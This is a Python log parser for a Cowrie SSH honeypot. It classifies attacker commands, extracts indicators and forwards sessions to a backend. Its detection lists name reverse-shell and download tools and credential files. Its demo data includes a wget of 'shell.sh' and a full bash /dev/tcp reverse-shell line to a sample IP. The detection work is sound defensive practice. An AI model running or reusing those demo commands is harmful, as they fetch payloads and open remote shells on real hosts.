#!/usr/bin/env python3
"""
SentinelAI Cowrie Log Parser
Usage:
  python log_parser.py --live          # watch cowrie.json in real time (resumes from PARSER_STATE_DIR)
  python log_parser.py --file f.json   # replay existing log
  python log_parser.py --demo          # generate fake sessions for testing
"""
import json, time, re, argparse, os, requests, logging, random, hashlib
from datetime import datetime
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("sentinel.parser")

API_BASE      = os.getenv("SENTINEL_API", "http://localhost:5000/api")
# The honeypot host should hold only the ingest key, not the AI-engine key (SENTINEL_KEY).
API_KEY       = os.getenv("HONEYPOT_API_KEY")
if not API_KEY:
    API_KEY = os.getenv("SENTINEL_KEY")
    if API_KEY:
        log.warning("HONEYPOT_API_KEY not set; falling back to SENTINEL_KEY. Set HONEYPOT_API_KEY on the honeypot host.")
if not API_KEY:
    raise RuntimeError("Configuration error: HONEYPOT_API_KEY environment variable is missing.")
COWRIE_LOG    = os.getenv("COWRIE_LOG",  "/opt/cowrie/var/log/cowrie/cowrie.json")
POLL_INTERVAL = 0.5
# Delivery retries for transient failures (connection errors, timeouts, HTTP 429/5xx). 4xx answers are
# final: retrying a rejected event cannot succeed.
POST_RETRIES  = int(os.getenv("SENTINEL_POST_RETRIES", "3"))
POST_BACKOFF  = float(os.getenv("SENTINEL_POST_BACKOFF", "0.5"))
HEADERS = {"Content-Type":"application/json","X-API-Key":API_KEY,"X-Source":"cowrie-parser"}
_sessions = {}

# Durable parser state, so a restart, backend outage or log rotation does not lose events:
#   state.json  - read position (inode + byte offset) in cowrie.json and the open sessions
#   spool.jsonl - deliveries that failed transiently, replayed in order once the backend answers
# The session state holds captured credentials (as cowrie.json itself does), so the directory is private.
STATE_DIR          = Path(os.getenv("PARSER_STATE_DIR", Path.home() / ".sentinelai" / "cowrie-parser"))
SPOOL_MAX          = int(os.getenv("SENTINEL_SPOOL_MAX", "50000"))
SPOOL_RETRY_SECONDS = float(os.getenv("SENTINEL_SPOOL_RETRY", "5"))
_spool = []
_spool_next_try = 0.0

IP_RE   = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
URL_RE  = re.compile(r"https?://[^\s\'\"]+")
HASH_RE = re.compile(r"\b[0-9a-fA-F]{32,64}\b")
SENSITIVE = ["/etc/passwd","/etc/shadow","/.ssh/","/root/","~/.bash_history"]
MALWARE   = ["wget","curl","chmod +x","base64 -d","/tmp/","python -c","nc -e","bash -i"]

def extract_iocs(text):
    return {"ips":list(set(IP_RE.findall(text))),"urls":list(set(URL_RE.findall(text))),"hashes":list(set(HASH_RE.findall(text))),"sensitiveFiles":[f for f in SENSITIVE if f in text]}

def classify_intent(cmd):
    c=cmd.lower()
    if re.search(r"cat /etc/(passwd|shadow)",c): return "CREDENTIAL_HARVEST"
    if re.search(r"(wget|curl)\s+https?://",c):  return "MALWARE_DOWNLOAD"
    if re.search(r"chmod|setuid",c):              return "PRIVILEGE_ESCALATION"
    if re.search(r"crontab|systemctl enable",c):  return "PERSISTENCE"
    if re.search(r"nc -e|bash -i|python -c",c):   return "REVERSE_SHELL"
    # Whole words only: a bare "id" matched any command containing those letters (android, hidden, ...)
    if re.search(r"\b(uname|id|whoami|ifconfig)\b",c):  return "RECONNAISSANCE"
    if re.search(r"rm -rf|dd if=",c):             return "DESTRUCTION"
    return "UNKNOWN"

def _send(ep, data, retries=POST_RETRIES):
    """One delivery with backoff. Returns "ok", "rejected" (4xx: final) or "transient" (retry later)."""
    for attempt in range(retries + 1):
        try:
            r = requests.post(f"{API_BASE}{ep}", json=data, headers=HEADERS, timeout=5)
            if r.status_code < 400:
                return "ok"
            if r.status_code != 429 and r.status_code < 500:
                log.warning("Backend rejected %s (HTTP %s)", ep, r.status_code)
                return "rejected"
        except requests.RequestException as ex:
            if attempt == retries:
                log.warning("Delivery to %s failed (%s)", ep, type(ex).__name__)
        if attempt < retries:
            time.sleep(POST_BACKOFF * (2 ** attempt))
    return "transient"

def _private_write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_name(path.name + ".tmp")
    tmp.write_text(text, encoding="utf-8")
    try: os.chmod(tmp, 0o600)
    except OSError: pass
    os.replace(tmp, path)

def _spool_path(): return STATE_DIR / "spool.jsonl"

def _spool_add(ep, data):
    _spool.append({"ep": ep, "data": data})
    if len(_spool) > SPOOL_MAX:
        del _spool[0]
        log.error("Delivery spool full (%d): oldest queued event dropped", SPOOL_MAX)
        _spool_persist()
        return
    _spool_path().parent.mkdir(parents=True, exist_ok=True)
    with open(_spool_path(), "a", encoding="utf-8") as f:
        f.write(json.dumps(_spool[-1]) + "\n")

def _spool_persist():
    _private_write(_spool_path(), "".join(json.dumps(item) + "\n" for item in _spool))

def load_spool():
    """Queued deliveries from a previous run (empty when there are none)."""
    _spool.clear()
    if _spool_path().exists():
        for line in _spool_path().read_text(encoding="utf-8").splitlines():
            try: _spool.append(json.loads(line))
            except ValueError: log.error("Discarding unreadable spool entry")
    if _spool: log.info("Resuming %d queued deliveries", len(_spool))

def flush_spool(force=False):
    """Send queued deliveries in order; stops at the first transient failure. Rejected entries are dropped."""
    global _spool_next_try
    if not _spool or (not force and time.monotonic() < _spool_next_try):
        return
    sent = 0
    while sent < len(_spool):
        item = _spool[sent]
        result = _send(item["ep"], item["data"], retries=0)
        if result == "transient":
            _spool_next_try = time.monotonic() + SPOOL_RETRY_SECONDS
            break
        if result == "rejected":
            log.warning("Dropping queued delivery to %s rejected by the backend", item["ep"])
        sent += 1
    if sent:
        del _spool[:sent]
        _spool_persist()
        log.info("Delivered %d queued events (%d still queued)", sent, len(_spool))

def post(ep, data):
    """
    Deliver an event, or queue it durably when the backend is unreachable/overloaded (connection error,
    timeout, 429, 5xx). Returns False only when the backend rejected the event (4xx); queued counts as
    accepted. While anything is queued, new events queue behind it so the backend sees them in order.
    """
    global _spool_next_try
    if _spool:
        _spool_add(ep, data)
        flush_spool()
        return True
    result = _send(ep, data)
    if result == "transient":
        log.warning("Backend unavailable: queued %s for redelivery", ep)
        _spool_add(ep, data)
        _spool_next_try = time.monotonic() + SPOOL_RETRY_SECONDS
        return True
    return result == "ok"

def event_id(e, payload=""):
    """
    Stable id of one Cowrie event, from fields Cowrie itself writes (session, eventid, timestamp with
    microseconds, command/URL). The backend ignores an id it has already applied, so replays, parser
    restarts and running the parser next to the output plugin cannot duplicate commands or downloads.
    The same derivation lives in honeypot/cowrie/sentinel_output.py.
    """
    ts = e.get("timestamp")
    if not ts:
        return None
    raw = f"{e.get('session', '')}|{e.get('eventid', '')}|{ts}|{payload}"
    return hashlib.sha256(raw.encode("utf-8", "replace")).hexdigest()[:32]

def _session_for(e):
    """
    Parser state for the event's session. If it was lost (parser restarted without saved state), it is
    rebuilt from the event: every Cowrie session event carries src_ip. Reopening is idempotent on the backend.
    """
    sid = e.get("session", "?")
    if sid not in _sessions and sid != "?" and e.get("src_ip"):
        on_connect({"session": sid, "src_ip": e["src_ip"], "src_port": e.get("src_port", 0)})
        log.info("Rebuilt parser state for session %s from a %s event", sid, e.get("eventid", "event"))
    return sid if sid in _sessions else None

def ensure_session_opened(sid):
    meta = _sessions.get(sid)
    if not meta:
        return False
    if not meta.get("openedPosted"):
        meta["hasSSHActivity"] = True
        if not post("/honeypot/ingest", {
            "eventType": "SESSION_OPENED",
            "sessionId": sid,
            "sourceIP": meta["sourceIP"],
            "sourcePort": meta.get("sourcePort", 0),
            "honeypotNode": "SSH-COWRIE-01",
            "protocol": "SSH",
            # Cowrie's own connect time, so replayed or delayed logs keep their real start time.
            "startTime": meta.get("startTime"),
        }):
            log.warning(f"Session opening was not acknowledged: {sid}")
            return False
        meta["openedPosted"] = True
        log.info(f"SSH session opening acknowledged: {sid} from {meta['sourceIP']}")
    return True

def on_connect(e):
    sid, ip = e.get("session", "?"), e.get("src_ip", "0.0.0.0")
    _sessions[sid] = {
        "sessionId": sid,
        "sourceIP": ip,
        "sourcePort": e.get("src_port", 0),
        "startTime": e.get("timestamp"),
        "commands": [],
        "credentials": [],
        "hassh": "",
        "hasSSHActivity": False,
        "openedPosted": False
    }

def on_login_failed(e):
    sid = _session_for(e)
    if not sid: return
    if not ensure_session_opened(sid): return
    _sessions[sid]["credentials"].append({"username": e.get("username"), "password": e.get("password"), "success": False})

def on_login_ok(e):
    sid = _session_for(e)
    if not sid: return
    if not ensure_session_opened(sid): return
    log.warning(f"Login SUCCESS: {_sessions[sid]['sourceIP']} (credentials omitted)")
    _sessions[sid]["credentials"].append({"username": e.get("username"), "password": e.get("password"), "success": True})

def _with_event_id(payload, eid):
    if eid: payload["eventId"] = eid
    return payload

def on_cmd(e):
    cmd = (e.get("input", "")).strip()
    if not cmd: return
    sid = _session_for(e)
    if not sid: return
    if not ensure_session_opened(sid): return
    ip = _sessions[sid]["sourceIP"]
    intent = classify_intent(cmd)
    iocs = extract_iocs(cmd)
    log.info("Command [%s]: %s (content omitted)", intent, ip)
    _sessions[sid]["commands"].append({"command": cmd, "intent": intent})
    post("/honeypot/ingest/command", _with_event_id({
        "sessionId": sid,
        "sourceIP": ip,
        "command": cmd,
        "intent": intent,
        "iocs": iocs,
        "isMalware": bool(URL_RE.search(cmd) and "wget" in cmd.lower())
    }, event_id(e, e.get("input", ""))))

def on_download(e):
    url = e.get("url", "")
    if not url: return
    sid = _session_for(e)
    if not sid: return
    if not ensure_session_opened(sid): return
    ip = _sessions[sid]["sourceIP"]
    log.warning("FILE DOWNLOAD: %s (URL omitted)", ip)
    post("/honeypot/ingest/download", _with_event_id({
        "sessionId": sid,
        "sourceIP": ip,
        "url": url,
        "sha256": e.get("shasum", ""),
        "filename": e.get("outfile", "")
    }, event_id(e, url)))

def on_kex(e):
    hassh = e.get("hassh", "")
    if not hassh: return
    sid = _session_for(e)
    if not sid: return
    if not ensure_session_opened(sid): return
    _sessions[sid]["hassh"] = hassh
    log.info(f"SSH client hassh: {sid} -> {hassh}")
    post("/honeypot/ingest", {"eventType": "CLIENT_KEX", "sessionId": sid, "hassh": hassh})

def session_duration_seconds(e):
    """
    Session length from cowrie.session.closed. Current Cowrie writes duration_ms (milliseconds, checked on
    cowrie c7773f4); older releases wrote duration (seconds). Reading only "duration" made every session 0 s.
    """
    if e.get("duration_ms") is not None:
        return float(e["duration_ms"]) / 1000.0
    return float(e.get("duration", 0))

def on_closed(e):
    sid = e.get("session", "?")
    dur = session_duration_seconds(e)
    meta = _sessions.get(sid)
    if not meta:
        # Parser restarted mid-session: its in-memory state is gone, but the backend may hold the
        # session. Deliver the close so it is analysed instead of staying "active" forever.
        if e.get("src_ip"):
            if post("/honeypot/ingest/close", {"sessionId": sid, "sourceIP": e["src_ip"], "durationSeconds": int(dur)}):
                log.info(f"Session closed without parser state (parser restarted): {sid}")
        return
    if meta.get("openedPosted"):
        acknowledged = post("/honeypot/ingest/close", {
            "sessionId": sid,
            "sourceIP": meta.get("sourceIP", "?"),
            "durationSeconds": int(dur),
            "commands": meta.get("commands", []),
            "credentials": meta.get("credentials", []),
            "hassh": meta.get("hassh", "")
        })
        if not acknowledged:
            log.warning("Session closure delivery was not acknowledged; retaining local state")
            return
        log.info(f"Session closed: {sid} ({dur}s)")
    else:
        log.debug(f"Ignoring connection with zero SSH activity: {sid} from {meta.get('sourceIP', '?')}")
    _sessions.pop(sid, None)

HANDLERS={"cowrie.session.connect":on_connect,"cowrie.login.failed":on_login_failed,"cowrie.login.success":on_login_ok,"cowrie.command.input":on_cmd,"cowrie.session.file_download":on_download,"cowrie.session.closed":on_closed,"cowrie.client.kex":on_kex}

def process(line):
    try:
        e = json.loads(line.strip())
        h = HANDLERS.get(e.get("eventid", ""))
        if h:
            h(e)
    except Exception as ex:
        log.error("Error processing log event (%s)", type(ex).__name__)

def _state_path(): return STATE_DIR / "state.json"

def load_state():
    try:
        return json.loads(_state_path().read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None

def save_state(ino, pos):
    _private_write(_state_path(), json.dumps({"ino": ino, "pos": pos, "sessions": _sessions}))

def read_lines(f, pos, ino, final=False):
    """
    Process every complete line from byte offset pos and persist the new offset after each one. A trailing
    line without its newline is still being written: it is left for the next poll, never half-parsed,
    unless final (a rotated-away file that will not grow any more).
    """
    f.seek(pos)
    while True:
        line = f.readline()
        if not line:
            break
        if not line.endswith(b"\n") and not final:
            break
        process(line.decode("utf-8", errors="replace"))
        pos = f.tell()
        save_state(ino, pos)
    return pos

def _rotated_sibling(path, ino):
    """The renamed file (cowrie.json.YYYY-MM-DD, ...) that still has inode ino, if any."""
    for p in path.parent.glob(path.name + "*"):
        try:
            if p != path and p.stat().st_ino == ino:
                return p
        except OSError:
            continue
    return None

def resume_position(path, state, from_start=False):
    """
    Byte offset to continue from in path. With saved state: the saved offset if the file is the same one;
    if Cowrie rotated it while the parser was down, the rest of the rotated file is processed first and
    the new file is read from the start. Without state: the end of the file (or 0 with --from-start).
    """
    st = path.stat()
    if not state:
        return 0 if from_start else st.st_size
    _sessions.update(state.get("sessions") or {})
    if state.get("ino") == st.st_ino:
        pos = int(state.get("pos", 0))
        if pos <= st.st_size:
            return pos
        log.info("Log truncated since last run: reading from the start")
        return 0
    old = _rotated_sibling(path, state.get("ino"))
    if old:
        log.info("Log rotated while stopped: finishing %s", old.name)
        with open(old, "rb") as f:
            read_lines(f, int(state.get("pos", 0)), state.get("ino"), final=True)
    else:
        log.warning("Log rotated while stopped and the previous file is gone: its unread lines are lost")
    return 0

def tail(filepath, from_start=False):
    path = Path(filepath)
    if not path.exists():
        log.warning(f"Waiting for {filepath}...")
        while not path.exists():
            time.sleep(2)
    log.info(f"Tailing {filepath} -> {API_BASE} (state in {STATE_DIR})")
    load_spool()
    flush_spool(force=True)
    current_file = None
    try:
        last_pos = resume_position(path, load_state(), from_start)
        current_file = open(path, "rb")
        current_ino = os.fstat(current_file.fileno()).st_ino
        save_state(current_ino, last_pos)
        while True:
            try:
                flush_spool()
                if path.exists():
                    stat = path.stat()
                    if stat.st_ino != current_ino:
                        # Renamed away: the still-open handle reads the old file to its end before switching.
                        read_lines(current_file, last_pos, current_ino, final=True)
                        log.info(f"Log rotated: {filepath}")
                        current_file.close()
                        current_file = open(path, "rb")
                        current_ino = os.fstat(current_file.fileno()).st_ino
                        last_pos = 0
                        save_state(current_ino, last_pos)
                    elif stat.st_size < last_pos:
                        log.info(f"Log truncated: {filepath}")
                        last_pos = 0
                    if stat.st_size > last_pos:
                        last_pos = read_lines(current_file, last_pos, current_ino)
            except Exception as ex:
                log.error("Tail error (%s)", type(ex).__name__)
            time.sleep(POLL_INTERVAL)
    finally:
        if current_file and not current_file.closed:
            current_file.close()

def replay(filepath, delay=0.0):
    with open(filepath,"r") as f:
        for line in f: process(line); delay and time.sleep(delay)

DEMO_IPS=["185.220.101.47","45.95.147.22","194.165.16.78","91.92.252.10"]
DEMO_CMDS=["uname -a","id","cat /etc/passwd","wget http://45.95.147.22/shell.sh","chmod +x shell.sh","ls -la /root","ps aux","netstat -tulnp","crontab -e","bash -i >& /dev/tcp/45.95.147.22/4444 0>&1"]

def demo(n=5):
    import uuid
    for i in range(n):
        sid=f"demo-{uuid.uuid4().hex[:8]}"; ip=random.choice(DEMO_IPS); num_cmds=random.randint(2,8); dur=random.randint(30,480)
        on_connect({"session":sid,"src_ip":ip,"src_port":random.randint(49152,65535)})
        time.sleep(0.1)
        on_kex({"session":sid,"hassh":"6372ee6957562199b2fb773b0be1bf34"})
        time.sleep(0.2); on_login_failed({"session":sid,"username":"root","password":"123456"})
        time.sleep(0.2); on_login_ok({"session":sid,"username":"root","password":"toor"})
        for _ in range(num_cmds): time.sleep(0.1); on_cmd({"session":sid,"input":random.choice(DEMO_CMDS)})
        on_closed({"session":sid,"duration":dur}); log.info(f"Demo session {i+1}/{n} done"); time.sleep(0.5)
    log.info("Demo complete!")

if __name__=="__main__":
    p=argparse.ArgumentParser()
    p.add_argument("--live",action="store_true"); p.add_argument("--file",type=str)
    p.add_argument("--demo",action="store_true"); p.add_argument("--sessions",type=int,default=5)
    p.add_argument("--delay",type=float,default=0.0); p.add_argument("--log",type=str,default=COWRIE_LOG)
    p.add_argument("--from-start",action="store_true",help="with no saved state, read the log from the beginning instead of its end")
    a=p.parse_args()
    if a.demo: demo(a.sessions)
    elif a.live:
        try: tail(a.log, a.from_start)
        except KeyboardInterrupt: log.info("Stopped")
    elif a.file: replay(a.file,a.delay)
    else: p.print_help()
